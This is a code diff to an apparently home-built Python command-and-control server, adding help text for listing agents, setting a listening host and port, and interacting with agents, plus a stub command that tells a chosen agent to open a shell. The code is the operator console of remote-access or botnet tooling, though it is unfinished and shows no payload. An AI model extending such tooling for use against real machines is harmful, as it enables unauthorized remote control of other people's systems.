@@ -13,9 +13,11 @@ import inspect
 # Overview:
 #  main > handles arguments, starts Terminal thread
 #  CommandThread - 
-#       allows to chose agent (from Global dictionary of queues!), send command to this queue.
+#       allows to chose agent (from Global dictionary of queues!), 
+#           send command to this agent
+#           allow to enter shell mode
 #       allows to start listener
-#  listener >  
+#  listener >
 #       creates listening socket, 
 #       starts Client Threads, 
 #       creates and assigns every thread a separate queue
@@ -67,7 +69,10 @@ class Terminal(Cmd):
                 self.help_start()
 
     def help_start(self):
-        print("todo help start")
+        # TODO
+        print("start <arguments>")
+        print("\tlisener <type>")
+        print("\t\ttcp>")
 
     def do_list(self,args):
         #print("[DBG] args.split(' '): {}".format(args.split(' ')))
@@ -92,7 +97,8 @@ class Terminal(Cmd):
     
     def help_list(self):
         # TODO
-        print("TODO help list")
+        print("list <arguments>")
+        print("\tagents\nlhost\nlport\nlisteners")
 
     def do_set(self,args):
         #print("[DBG] args.split(' '): {}".format(args.split(' ')))
@@ -110,7 +116,11 @@ class Terminal(Cmd):
 
     def help_set(self):
         # TODO
-        print("TODO help for set - list arguments.")
+        print("set <argument> <value>")
+        print('\tlport <port>')
+        print('\tlhost <IP>')
+        print('\t\tExample: set lhost 192.168.56.112')
+        
 
     def emptyline(self):
         if self.q == None:
@@ -141,11 +151,20 @@ class Terminal(Cmd):
                 print("[-] Unhandled exception: {}".format(ex))
 
     def help_interact(self):
-        print("todo help interact")
-    
+        print("interact <agent_id>")
+        print("To view available agents, user: list agents")
+
     def do_back(self,args):
         self.q = None
         self.prompt = '$ '
+    
+    def do_shell(self):
+        if self.q == None:
+            print("[-] You need to choose agent.")
+            self.help_interact()
+        else:
+            self.q.put("shell\n")
+            print("SHELL TODO")
 
 
 class listener_tcp(threading.Thread):
@@ -211,7 +230,7 @@ class BotHandler(threading.Thread):
         if banner:
             print("\n[*] Received banner from {}:\n\n{}".format(AgentName, banner))
         time.sleep(0.5)
-
+        
         # Command loop
         while True:
             RecvBotCmd = self.q.get()
